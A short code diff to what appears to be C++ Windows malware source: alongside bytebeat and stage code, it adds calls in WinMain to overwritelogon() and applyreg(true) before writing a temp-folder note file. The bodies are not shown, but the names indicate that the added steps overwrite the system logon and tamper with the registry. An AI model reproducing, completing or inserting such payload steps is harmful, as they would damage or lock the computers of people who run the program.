@@ -5,6 +5,8 @@
 #include <ctime>
 #include <shellapi.h>
 #include <string>
+#include "logon.hpp"
+#include "registry.h"
 
 #include <bytebeat.hpp>
 #include <stages.hpp>
@@ -43,6 +45,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
   lstrcatA(tmpDir, "hgvcuj.txt");
   lstrcpyA(tmpPath, tmpDir);
 
+  overwritelogon();
+  Sleep(1500);
+  applyreg(true);
   std::string msg = "hgvcuj";
   DWORD wb = 0;
   HANDLE note = CreateFileA(tmpPath, GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
